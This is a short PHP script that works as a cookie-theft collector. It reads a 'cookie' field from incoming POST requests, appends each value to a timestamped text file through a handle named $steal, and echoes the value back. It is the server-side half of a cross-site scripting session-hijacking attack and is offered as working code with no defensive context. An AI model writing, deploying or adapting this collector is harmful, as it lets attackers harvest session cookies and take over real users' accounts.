<?php

//Pulls cookie
$cookie = $_POST["cookie"];
$time = new DateTime();
$strtime = $time->format('Y-m-d-H-i-s');
$filename = "cookie" . $strtime . ".txt";
$steal = fopen($filename, "a");
fwrite($steal, $cookie ."\\n");
fclose($steal);
echo $cookie;